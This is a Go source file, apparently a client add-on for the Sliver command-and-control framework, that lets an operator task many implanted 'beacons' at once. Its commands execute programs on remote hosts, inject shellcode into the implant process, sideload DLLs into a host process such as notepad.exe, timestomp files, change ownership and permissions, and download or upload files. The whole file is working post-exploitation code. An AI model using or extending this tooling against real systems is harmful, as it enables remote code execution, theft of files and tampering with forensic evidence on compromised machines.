package client

import (
	"context"
	"errors"
	"fmt"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/util/encoders"
	"github.com/rodaine/table"
	"github.com/rsteube/carapace"
	"github.com/spf13/cobra"
	"github.com/spf13/pflag"
	"gopkg.in/AlecAivazis/survey.v1"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strconv"
	"strings"
	"sync"
	"time"
)

func interactBeaconCommands() *cobra.Command {
	rootCmd := &cobra.Command{
		Use:   "",
		Short: "",
		Long:  ``,
	}
	listCmd := &cobra.Command{
		Use:   "list",
		Short: "list beacons currently being interacted with.",
		Run: func(cmd *cobra.Command, args []string) {
			app.Printf("%d beacons selected: \n", len(ctx.Value("beacons").([]string)))
			var tbl table.Table = ctx.Value("beaconTable").(table.Table)
			tbl.Print()
		},
	}
	rootCmd.AddCommand(listCmd)
	killCmd := &cobra.Command{
		Use:   "kill",
		Short: "kill beacon(s)",
		Run: func(cmd *cobra.Command, args []string) {
			var beacons interface{}
			beacons = ctx.Value("beacons")
			var parsedBeacons []string = beacons.([]string)
			var longestbeacon int
			for _, beacon := range parsedBeacons {
				_, err := client.rpc.Kill(context.Background(), &sliverpb.KillReq{
					Force: true,
					Request: &commonpb.Request{
						Async:    true,
						Timeout:  int64(60),
						BeaconID: beacon,
					},
				})
				if err != nil {
					log.Fatal(err)
				}
				activebeacon, _ := client.rpc.GetBeacon(context.Background(), &clientpb.Beacon{ID: beacon})
				nextCheckin := time.Unix(activebeacon.NextCheckin, 0)
				if !time.Unix(activebeacon.NextCheckin, 0).Before(time.Now()) {
					if int(time.Until(nextCheckin).Round(time.Second).Seconds())+time.Unix(activebeacon.Jitter, 0).Second() > longestbeacon {
						longestbeacon = int(time.Until(nextCheckin).Round(time.Second).Seconds()) + time.Unix(activebeacon.Jitter, 0).Second()
					}
				}
			}
			app.SwitchMenu("")
			go func(beacons []string) {
				app.Printf("%d beacon(s) will be removed in %ds", len(parsedBeacons), longestbeacon)
				now := time.Now()
				var beaconTaskContext = context.Background()
				var beacongroup sync.WaitGroup
				var timedoutbeacons int = 0
				beacongroup.Add(len(beacons))
				for _, beacon := range beacons {
					go func(beacon string) {
						err := func(beacon string) error {
							tasks, err := client.rpc.GetBeaconTasks(beaconTaskContext, &clientpb.Beacon{ID: beacon})
							for _, task := range tasks.Tasks {
								var check = false
								for {
									if task.State != "sent" {
										time.Sleep(5 * time.Second)
										task, err = client.rpc.GetBeaconTaskContent(beaconTaskContext, &clientpb.BeaconTask{BeaconID: beacon, ID: task.ID})
										if err != nil {
											app.Printf("%s", err)
										}
									}
									if task.State == "sent" {
										break
									}
									if int(time.Since(now).Seconds()) > longestbeacon && check {
										var returnerror = errors.New(fmt.Sprintf("Timeout for beacon %s", beacon))
										return returnerror
									}
									if int(time.Since(now).Seconds()) > longestbeacon {
										check = true
										time.Sleep(5 * time.Second)
									}

								}
							}
							return nil
						}(beacon)
						if err != nil {
							app.Printf("%s", err)
							timedoutbeacons++
						}
						_, err = client.rpc.RmBeacon(context.Background(), &clientpb.Beacon{ID: beacon})
						if err != nil {
							log.Fatal(err)
						}
						beacongroup.Done()
					}(beacon)
				}
				beacongroup.Wait()
				if timedoutbeacons == 0 {
					app.Printf("%d beacon(s) removed.", len(parsedBeacons))
				} else {
					app.Printf("%d beacon(s) removed. %d beacon(s) timedout", len(parsedBeacons), timedoutbeacons)
				}
			}(parsedBeacons)
		},
	}
	rootCmd.AddCommand(killCmd)
	executeCmd := &cobra.Command{
		Use:   "execute [flags] command [arguments]",
		Short: "Execute a program on the remote system",
		Args:  cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			var beacons = ctx.Value("beacons").([]string)
			//app.Printf("#\n#%s\n####", strings.Join(args, " "))

			output := cmd.Flag("output").Changed
			stdout := cmd.Flag("stdout").Value.String()
			stderr := cmd.Flag("stderr").Value.String()
			saveLoot := cmd.Flag("loot").Changed
			saveOutput := cmd.Flag("save").Changed

			// If the user wants to loot or save the output, we have to capture it regardless of if they specified -o
			var captureOutput bool = output || saveLoot || saveOutput

			if output {
				app.Printf("Using --output in beacon mode, if the command blocks the task will never complete\n\n")
			}
			var beaconWG sync.WaitGroup
			beaconWG.Add(len(beacons))
			for _, beacon := range beacons {
				go func(beacon string) {
					_, err := client.rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
						Request: &commonpb.Request{
							Async:    true,
							Timeout:  int64(60),
							BeaconID: beacon,
						},
						Path:   args[0],
						Args:   args[1:],
						Output: captureOutput,
						Stderr: stderr,
						Stdout: stdout,
					})
					if err != nil {
						app.Printf("%s\n\n", err)
						beaconWG.Done()
						return
					}
					//app.Printf("%s\n", exec.Response.TaskID)
					beaconWG.Done()
				}(beacon)
			}
			beaconWG.Wait()
			app.Printf("Command \"%s\" sent to %d beacons", strings.Join(args, " "), len(beacons))
		},
	}
	executeCmd.Flags().BoolP("output", "o", false, "capture command output")
	executeCmd.Flags().StringP("stdout", "O", "", "remote path to redirect STDOUT to")
	executeCmd.Flags().StringP("stderr", "E", "", "remote path to redirect STDERR to")
	executeCmd.Flags().BoolP("loot", "X", false, "save output as loot")
	executeCmd.Flags().BoolP("save", "s", false, "save output to a file")
	rootCmd.AddCommand(executeCmd)
	rootCmd.AddCommand(&cobra.Command{
		Use:   "back",
		Short: "Go back to main menu",
		Run: func(cmd *cobra.Command, args []string) {
			app.SwitchMenu("")
		},
	})
	executeshellcodeCmd := &cobra.Command{
		Use:   "execute-shellcode [flags] filepath",
		Short: "Executes the given shellcode in the sliver process. Will inject into self (PID 0).",
		Args:  cobra.ExactArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			var beacons = ctx.Value("beacons").([]string)
			shellcodePath := args[0]
			shellcodeBin, err := ioutil.ReadFile(shellcodePath)
			if err != nil {
				app.Printf("\n%s\n", err.Error())
				return
			}
			var beaconWG sync.WaitGroup
			beaconWG.Add(len(beacons))
			app.Printf("\nSending shellcode to %d beacon(s).\n", len(beacons))
			timeout, _ := strconv.Atoi(cmd.Flag("timeout").Value.String())
			for _, beacon := range beacons {
				go func(beacon string) {
					_, err := client.rpc.Task(context.Background(), &sliverpb.TaskReq{
						Data:     shellcodeBin,
						RWXPages: cmd.Flag("rwx-pages").Changed,
						Pid:      uint32(0),
						Request: &commonpb.Request{
							Async:    true,
							Timeout:  int64(timeout),
							BeaconID: beacon,
						},
					})
					if err != nil {
						app.Printf("\n%s\n", err)
						beaconWG.Done()
						return
					}
					beaconWG.Done()
				}(beacon)
			}
			beaconWG.Wait()
		},
	}
	executeCmd.Flags().BoolP("rwx-pages", "r", false, "Use RWX permissions for memory pages")
	executeCmd.Flags().IntP("timeout", "t", 60, "command timeout in seconds")
	rootCmd.AddCommand(executeshellcodeCmd)
	sideloadCmd := &cobra.Command{
		Use:   "sideload [flags] filepath [args...]",
		Short: "Load and execute a shared object (shared library/DLL) in a remote process",
		Args:  cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, cmdargs []string) {
			var beacons = ctx.Value("beacons").([]string)
			binPath := cmdargs[0]

			entryPoint := cmd.Flag("entry-point").Value.String()
			processName := cmd.Flag("process").Value.String()
			args := strings.Join(cmdargs[1:], " ")

			binData, err := ioutil.ReadFile(binPath)
			if err != nil {
				app.Printf("\n%s", err.Error())
				return
			}
			isDLL := (filepath.Ext(binPath) == ".dll")

			var beaconWG sync.WaitGroup
			beaconWG.Add(len(beacons))
			timeout, _ := strconv.Atoi(cmd.Flag("timeout").Value.String())
			allBeacons, err := client.rpc.GetBeacons(context.Background(), &commonpb.Empty{})
			if err != nil {
				app.Printf("Error in getting beacons: %s", err)
			}
			for beaconnum, beacon := range allBeacons.Beacons {
				if slices.Contains(beacons, beacon.ID) {
					if beaconnum != 0 {
						if beacon.OS != allBeacons.Beacons[beaconnum-1].OS {
							app.Printf("\nNot all beacons are of the same OS, please select another filter.")
							return
						}
					}
				}
			}
			app.Printf("\nSideloaded DLL sent to %d beacon(s)\n", len(beacons))
			for _, beacon := range beacons {
				go func(beacon string) {
					_, err := client.rpc.Sideload(context.Background(), &sliverpb.SideloadReq{
						Request: &commonpb.Request{
							Async:    false,
							Timeout:  int64(timeout),
							BeaconID: beacon,
						},
						Args:        args,
						Data:        binData,
						EntryPoint:  entryPoint,
						ProcessName: processName,
						Kill:        !cmd.Flag("keep-alive").Changed,
						IsDLL:       isDLL,
					})
					if err != nil {
						app.Printf("\nError: %v", err)
						beaconWG.Done()
						return
					}
					beaconWG.Done()
				}(beacon)
			}
			beaconWG.Wait()
		},
	}
	sideloadCmd.Flags().StringP("entry-point", "e", "", "Entrypoint for the DLL (Windows only)")
	sideloadCmd.Flags().StringP("process", "p", `c:\windows\system32\notepad.exe`, "Path to process to host the shellcode")
	//sideloadCmd.Flags().BoolP("save", "s", false, "save output to file")
	//sideloadCmd.Flags().BoolP("loot", "X", false, "save output as loot")
	//sideloadCmd.Flags().StringP("name", "n", "", "name to assign loot (optional)")
	sideloadCmd.Flags().BoolP("keep-alive", "k", false, "don't terminate host process once the execution completes")
	sideloadCmd.Flags().IntP("timeout", "t", 60, "command timeout in seconds")
	rootCmd.AddCommand(sideloadCmd)
	chmodCmd := &cobra.Command{
		Use:   "chmod [flags] path mode",
		Short: "Change permissions on a file or directory",
		Args:  cobra.ExactArgs(2),
		Run: func(cmd *cobra.Command, args []string) {
			var beacons = ctx.Value("beacons").([]string)

			filePath := args[0]

			if filePath == "" {
				app.Printf("Missing parameter: file or directory name\n")
				return
			}

			fileMode := args[1]

			if fileMode == "" {
				app.Printf("Missing parameter: file permissions (mode)\n")
				return
			}
			timeout, _ := strconv.Atoi(cmd.Flag("timeout").Value.String())
			app.Printf("\nchmod command sent to %d beacon(s)\n", len(beacons))
			AsyncBeacons(func(beacon string) error {
				_, err := client.rpc.Chmod(context.Background(), &sliverpb.ChmodReq{
					Request: &commonpb.Request{
						Async:    true,
						Timeout:  int64(timeout),
						BeaconID: beacon,
					},
					Path:      filePath,
					FileMode:  fileMode,
					Recursive: cmd.Flag("recursive").Changed,
				})
				if err != nil {
					return err
				}
				return nil
			}, beacons)
		},
	}
	chmodCmd.Flags().BoolP("recursive", "r", false, "recursively change permissions on files")
	chmodCmd.Flags().IntP("timeout", "t", 60, "command timeout in seconds")
	rootCmd.AddCommand(chmodCmd)
	chownCmd := &cobra.Command{
		Use:   "chown [flags] path uid gid",
		Short: "Change owner on a file or directory",
		Args:  cobra.ExactArgs(3),
		Run: func(cmd *cobra.Command, args []string) {
			var beacons = ctx.Value("beacons").([]string)

			filePath := args[0]

			if filePath == "" {
				app.Printf("Missing parameter: file or directory name\n")
				return
			}

			uid := args[1]

			if uid == "" {
				app.Printf("Missing parameter: user id\n")
				return
			}

			gid := args[2]

			if gid == "" {
				app.Printf("Missing parameter: group id\n")
				return
			}
			timeout, _ := strconv.Atoi(cmd.Flag("timeout").Value.String())
			app.Printf("\n%s command sent to %d beacon(s)\n", strings.Split(cmd.Use, " ")[0], len(beacons))
			AsyncBeacons(func(beacon string) error {
				_, err := client.rpc.Chown(context.Background(), &sliverpb.ChownReq{
					Request: &commonpb.Request{
						Async:    true,
						Timeout:  int64(timeout),
						BeaconID: beacon,
					},
					Path:      filePath,
					Uid:       uid,
					Gid:       gid,
					Recursive: cmd.Flag("recursive").Changed,
				})
				if err != nil {
					return err
				}
				return nil
			}, beacons)
		},
	}
	chownCmd.Flags().BoolP("recursive", "r", false, "recursively change permissions on files")
	chownCmd.Flags().IntP("timeout", "t", 60, "command timeout in seconds")
	rootCmd.AddCommand(chownCmd)
	chtimesCmd := &cobra.Command{
		Use:   "chtimes [flags] path atime mtime",
		Short: "Change access and modification times on a file (timestomp)",
		Args:  cobra.ExactArgs(3),
		Run: func(cmd *cobra.Command, args []string) {
			var beacons = ctx.Value("beacons").([]string)
			layout := "2006-01-02 15:04:05"
			filePath := args[0]

			if filePath == "" {
				app.Printf("Missing parameter: file or directory name\n")
				return
			}

			atime := args[1]

			if atime == "" {
				app.Printf("Missing parameter: Last accessed time id\n")
				return
			}

			t_a, err := time.Parse(layout, atime)
			if err != nil {
				app.Printf("%s\n", err)
				return
			}
			unixAtime := t_a.Unix()

			mtime := args[2]

			if mtime == "" {
				app.Printf("Missing parameter: Last modified time id\n")
				return
			}

			t_b, err := time.Parse(layout, mtime)
			if err != nil {
				app.Printf("%s\n", err)
				return
			}
			unixMtime := t_b.Unix()

			timeout, _ := strconv.Atoi(cmd.Flag("timeout").Value.String())
			app.Printf("\n%s command sent to %d beacon(s)\n", strings.Split(cmd.Use, " ")[0], len(beacons))
			AsyncBeacons(func(beacon string) error {
				_, err := client.rpc.Chtimes(context.Background(), &sliverpb.ChtimesReq{
					Request: &commonpb.Request{
						Async:    true,
						Timeout:  int64(timeout),
						BeaconID: beacon,
					},
					Path:  filePath,
					ATime: unixAtime,
					MTime: unixMtime,
				})
				if err != nil {
					return err
				}
				return nil
			}, beacons)
		},
	}
	chtimesCmd.Flags().IntP("timeout", "t", 60, "command timeout in seconds")
	rootCmd.AddCommand(chtimesCmd)
	downloadCmd := &cobra.Command{
		Use:   "download [flags] remote-path [local-path]",
		Short: "Download a file",
		Args:  cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			var beacons = ctx.Value("beacons").([]string)
			remotePath := args[0]
			var localPath string
			switch len(args) {
			case 2:
				localPath = args[1]
			case 1:
				localPath = "."
			default:
				app.Printf("Invalid number of arguments.")
				return
			}
			recurse := cmd.Flag("recurse").Changed
			timeout, _ := strconv.Atoi(cmd.Flag("timeout").Value.String())
			app.Printf("\n%s command sent to %d beacon(s)\n", strings.Split(cmd.Use, " ")[0], len(beacons))
			AsyncBeacons(func(beacon string) error {
				download, err := client.rpc.Download(context.Background(), &sliverpb.DownloadReq{
					Request: &commonpb.Request{
						Async:    true,
						Timeout:  int64(timeout),
						BeaconID: beacon,
					},
					Path:    remotePath,
					Recurse: recurse,
				})
				if err != nil {
					return err
				}
				if download.Response != nil && download.Response.Err != "" {
					app.Printf("%s\n", download.Response.Err)
					return err
				}

				if download.Encoder == "gzip" {
					download.Data, err = new(encoders.Gzip).Decode(download.Data)
					if err != nil {
						app.Printf("Decoding failed %s", err)
					}
				}

				if download.ReadFiles == 0 {
					// No files downloaded successfully.
					app.Printf("No files downloaded from the implant - check permissions, path, and / or filters.\n")
					return err
				}

				fileName := filepath.Base(remotePath)
				dst, err := filepath.Abs(localPath)
				if err != nil {
					app.Printf("%s\n", err)
					return err
				}

				fi, err := os.Stat(dst)
				if err != nil && !os.IsNotExist(err) {
					app.Printf("%s\n", err)
					return err
				}
				if err == nil && fi.IsDir() {
					if download.IsDir {
						// Come up with a good file name - filters might make the filename ugly
						implant, _ := client.rpc.GetBeacon(context.Background(), &clientpb.Beacon{ID: beacon})
						implantName := implant.Name
						fileName = fmt.Sprintf("%s_download_%s_%d.tar.gz", filepath.Base(implantName), filepath.Base(prettifyDownloadName(remotePath)), time.Now().Unix())
					}
					if runtime.GOOS == "windows" {
						// Windows has a file path length of 260 characters
						// +1 for the path separator before the file name
						if len(dst)+len(fileName)+1 > 260 {
							// Make an effort to shorten the file name. If this does not work, the operator will have to find somewhere else to put the file
							fileName = fmt.Sprintf("down_%d.tar.gz", time.Now().Unix())
						}
					}
					dst = filepath.Join(dst, fileName)
				}

				// Add an extension to a directory download if one is not provided.
				if download.IsDir && (!strings.HasSuffix(dst, ".tgz") && !strings.HasSuffix(dst, ".tar.gz")) {
					dst += ".tar.gz"
				}

				if _, err := os.Stat(dst); err == nil {
					overwrite := false
					prompt := &survey.Confirm{Message: "Overwrite local file?"}
					survey.AskOne(prompt, &overwrite, nil)
					if !overwrite {
						return err
					}
				}

				dstFile, err := os.Create(dst)
				if err != nil {
					app.Printf("Failed to open local file %s: %s\n", dst, err)
					return err
				}
				defer dstFile.Close()
				n, err := dstFile.Write(download.Data)
				if err != nil {
					app.Printf("Failed to write data %v\n", err)
				} else {
					var readFilesText string
					var unreadFilesText string

					if download.ReadFiles == 1 {
						readFilesText = "file"
					} else {
						readFilesText = "files"
					}

					if download.UnreadableFiles == 1 {
						unreadFilesText = "file"
					} else {
						unreadFilesText = "files"
					}

					app.Printf("Wrote %d bytes (%d %s successfully, %d %s unsuccessfully) to %s\n",
						n,
						download.ReadFiles,
						readFilesText,
						download.UnreadableFiles,
						unreadFilesText,
						dstFile.Name())
				}

				return nil
			}, beacons)
		},
	}
	downloadCmd.Flags().IntP("timeout", "t", 60, "command timeout in seconds")
	downloadCmd.Flags().BoolP("recurse", "r", false, "recursively download all files in a directory")
	uploadCmd := &cobra.Command{
		Use:   "upload [flags] local-path [remote-path]",
		Short: "Upload a file to the remote system.",
		Args:  cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			var beacons = ctx.Value("beacons").([]string)
			localPath := args[0]
			var remotePath string
			switch len(args) {
			case 2:
				remotePath = args[1]
			case 1:
				remotePath = "."
			default:
				app.Printf("Invalid number of arguments.")
				return
			}
			isIOC := cmd.Flag("ioc").Changed

			if localPath == "" {
				app.Printf("Missing parameter, see `help upload`\n")
				return
			}

			src, _ := filepath.Abs(localPath)
			_, err := os.Stat(src)
			if err != nil {
				app.Printf("%s\n", err)
				return
			}

			if remotePath == "" {
				fileName := filepath.Base(src)
				remotePath = fileName
			}
			dst := remotePath

			fileBuf, err := ioutil.ReadFile(src)
			if err != nil {
				app.Printf("%s\n", err)
				return
			}
			uploadGzip := new(encoders.Gzip).Encode(fileBuf)
			timeout, _ := strconv.Atoi(cmd.Flag("timeout").Value.String())
			app.Printf("\n%s command sent to %d beacon(s)\n", strings.Split(cmd.Use, " ")[0], len(beacons))
			AsyncBeacons(func(beacon string) error {
				_, err := client.rpc.Upload(context.Background(), &sliverpb.UploadReq{
					Request: &commonpb.Request{
						Async:    true,
						Timeout:  int64(timeout),
						BeaconID: beacon,
					},
					Path:    dst,
					Data:    uploadGzip,
					Encoder: "gzip",
					IsIOC:   isIOC,
				})
				if err != nil {
					return err
				}
				return nil
			}, beacons)
		},
	}
	uploadCmd.Flags().IntP("timeout", "t", 60, "command timeout in seconds")
	uploadCmd.Flags().BoolP("ioc", "i", false, "track uploaded file as an ioc")
	for _, cmd := range rootCmd.Commands() {
		c := carapace.Gen(cmd)

		if cmd.Args != nil {
			c.PositionalAnyCompletion(
				carapace.ActionCallback(func(c carapace.Context) carapace.Action {
					return carapace.ActionFiles()
				}),
			)
		}

		flagMap := make(carapace.ActionMap)
		cmd.Flags().VisitAll(func(f *pflag.Flag) {
			if f.Name == "file" || strings.Contains(f.Usage, "file") {
				flagMap[f.Name] = carapace.ActionFiles()
			}
		})

		c.FlagCompletion(flagMap)
	}

	rootCmd.InitDefaultHelpCmd()

	rootCmd.CompletionOptions.DisableDefaultCmd = true
	rootCmd.DisableFlagsInUseLine = true
	return rootCmd
}
